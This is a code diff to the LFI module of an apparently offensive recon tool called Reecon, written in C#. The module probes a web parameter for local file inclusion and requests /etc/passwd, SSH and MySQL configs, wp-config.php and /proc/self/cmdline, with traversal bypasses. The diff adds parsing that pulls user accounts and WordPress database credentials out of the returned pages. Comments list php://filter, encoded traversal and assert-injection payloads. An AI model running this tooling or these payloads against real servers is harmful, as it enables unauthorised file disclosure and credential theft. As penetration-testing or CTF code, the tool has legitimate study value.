@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Net;
 using ReeCode;
 
@@ -8,7 +9,7 @@ namespace Reecon
     class LFI
     {
         [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
-        private static WebClient wc = new WebClient();
+        private static WebClient wc = new();
         private static string initialPart = "";
         private static int notFoundLength = 0;
         public static void Scan(string[] args)
@@ -36,7 +37,7 @@ namespace Reecon
 
             if (OS == General.OS.Linux)
             {
-                List<string> webChecks = new List<string>
+                List<string> webChecks = new()
                 {
                     // General web checks
                     "/var/www/html/.htpasswd",
@@ -44,19 +45,20 @@ namespace Reecon
 
                     // Wordpress
                     "/var/www/html/wp-config.php",
-                    "/var/www/html/wordpress/wp-config.php"
+                    "/var/www/html/wordpress/wp-config.php",
+                    "/var/www/wordpress/wp-config.php"
                 };
                 DoLFI(webChecks);
 
                 // Do nginx checks
-                List<string> linux_nginx = new List<string>
+                List<string> linux_nginx = new()
                 {
                     "/etc/nginx/sites-available/default"
                 };
                 DoLFI(linux_nginx);
 
                 // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
-                List<string> linux_apache = new List<string>
+                List<string> linux_apache = new()
                 {
                     "/etc/apache2/sites-available/000-default.conf"
                 };
@@ -78,14 +80,14 @@ namespace Reecon
                 }
 
                 // Do some logging checks
-                List<string> linux_logs = new List<string>()
+                List<string> linux_logs = new()
                 {
                     "/var/log/vsftpd.log"
                 };
                 DoLFI(linux_logs);
 
                 // Do MySQL Checks
-                List<string> linux_mysql = new List<string>
+                List<string> linux_mysql = new()
                 {
                     "/etc/my.cnf",
                     "/etc/mysql/my.cnf",
@@ -94,7 +96,7 @@ namespace Reecon
                 DoLFI(linux_mysql);
 
                 // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
-                List<string> linux_tomcat9 = new List<string>
+                List<string> linux_tomcat9 = new()
                 {
                     "/etc/cron.daily/tomcat9",
                     "/etc/rsyslog.d/tomcat9.conf",
@@ -109,7 +111,7 @@ namespace Reecon
                 DoLFI(linux_tomcat9);
 
                 // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
-                List<string> linux_ssh = new List<string>
+                List<string> linux_ssh = new()
                 {
                     "/etc/ssh/ssh_config",
                     "/etc/ssh/sshd_config",
@@ -130,6 +132,10 @@ namespace Reecon
                 // Unknown - Do All Checks
             }
             Console.WriteLine("All Checks Done!");
+            if (OS == General.OS.Linux)
+            {
+                Console.WriteLine("Note: If you can create sessions, they can be stored in /tmp/ses_SESSID");
+            }
         }
 
         // Initial Checks
@@ -145,14 +151,19 @@ namespace Reecon
 
             initialPart = path.Substring(0, path.IndexOf("=") + 1);
             string result = wc.Get(initialPart + "Reelix", null);
-            notFoundLength = result.Length;
+            notFoundLength = result.Length - 6; // Reelix is 6 characters - Don't need to include that
+            // Some not-found pages can be blank
+            if (notFoundLength < 0)
+            {
+                notFoundLength = 0;
+            }
             Console.WriteLine("NFL: " + notFoundLength);
         }
 
         private static General.OS GetOS()
         {
             // Linux
-            List<string> linuxChecks = new List<string>
+            List<string> linuxChecks = new()
             {
                 "/etc/passwd",
                 "/etc/resolv.conf",
@@ -160,7 +171,8 @@ namespace Reecon
                 "/var/www/html/index.php",
                 "/etc/hostname", // Box Hostname
                 "/etc/issue", // Shows the Release
-                "/etc/group" // Groups
+                "/etc/group", // Groups
+                "/proc/self/cmdline" // Running commandline
             };
             bool hasResult = DoLFI(linuxChecks);
             if (hasResult)
@@ -169,7 +181,7 @@ namespace Reecon
             }
 
             // Windows
-            List<string> windowsChecks = new List<string>
+            List<string> windowsChecks = new()
             {
                 "/boot.ini", // Basic boot.ini
                 "/inetpub/wwwroot/index.php", // Basic IIS Webserver
@@ -189,14 +201,19 @@ namespace Reecon
 
         private static bool DoLFI(List<string> lfiChecks)
         {
+            // To Implement:
+            // We only need to do a bypass once on the initial OS check.
+            // If it's working, it's working - Don't need to try each bypass every time
+            // Maybe base64'ing PHP might be useful though...
+
             // TODO: Null Byte each
             // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
-            // TODO: Asset Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
+            // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
 
             // If it must contain a word
             // php://filter/read=convert.base64-encode/wordhere/resource=flag
 
-            // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd - Default?
+            // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
             // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
             bool hasResult = false;
@@ -207,12 +224,12 @@ namespace Reecon
                 string toCheck = initialPart + check;
                 try
                 {
-                    string result = Web.GetHTTPInfo(toCheck, null, 5000).PageText;
+                    string result = Web.GetHTTPInfo(toCheck).PageText;
                     int resultLength = result.Length;
-                    // - 6 = Length of the NotFound Search = Reelix
-                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6) && !result.Contains("failed to open stream"))
+                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length) && !result.Contains("failed to open stream"))
                     {
-                        Console.WriteLine(resultLength + " -- " + toCheck);
+                        Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
+                        ParseUsefulEntries(toCheck, result);
                         // Don't need to try more if it's already true
                         hasResultCurrent = true;
                         hasResult = true;
@@ -228,13 +245,13 @@ namespace Reecon
                     toCheck = initialPart + "/../../../../.." + check;
                     try
                     {
-                        string result = Web.GetHTTPInfo(toCheck, null, 5000).PageText;
+                        string result = Web.GetHTTPInfo(toCheck, null).PageText;
                         int resultLength = result.Length;
-                        // - 6 = Length of the NotFound Search = Reelix
                         // + 15 = Length of the bypass
-                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6 + 15) && !result.Contains("failed to open stream"))
+                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + 15) && !result.Contains("failed to open stream"))
                         {
-                            Console.WriteLine(resultLength + " -- " + toCheck);
+                            ParseUsefulEntries(toCheck, result);
+                            Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
                             hasResult = true;
                         }
                     }
@@ -245,6 +262,40 @@ namespace Reecon
                 }
             }
             return hasResult;
+        }
+
+        private static void ParseUsefulEntries(string entry, string pageText)
+        {
+            if (entry.Contains("/etc/passwd"))
+            {
+                if (pageText.Contains("root:x:0:0:root:/root"))
+                {
+                    string passwdText = pageText.Remove(0, pageText.IndexOf("root:x:0:0:root:/root"));
+                    List<string> pageLines = passwdText.Replace("\r", "").Split('\n').ToList();
+                    foreach (string line in pageLines)
+                    {
+                        if (line.Contains("/bin/bash") || line.Contains("/home"))
+                        {
+                            Console.WriteLine("----> " + line);
+                        }
+                    }
+                }
+            }
+            else if (entry.EndsWith("wp-config.php"))
+            {
+                if (pageText.Contains("DB_USER'") && pageText.Contains("DB_PASSWORD'"))
+                {
+                    string userText = pageText.Remove(0, pageText.IndexOf("DB_USER'") + 8);
+                    userText = userText.Remove(0, (userText.IndexOf("'") + 1));
+                    userText = userText.Substring(0, userText.IndexOf("' );"));
+                    Console.WriteLine("----> Wordpress Database Username: " + userText);
+
+                    string passText = pageText.Remove(0, pageText.IndexOf("DB_PASSWORD'") + 12);
+                    passText = passText.Remove(0, (passText.IndexOf("'") + 1));
+                    passText = passText.Substring(0, passText.IndexOf("' );"));
+                    Console.WriteLine("----> Wordpress Database Password: " + passText);
+                }
+            }
         }
     }
 }
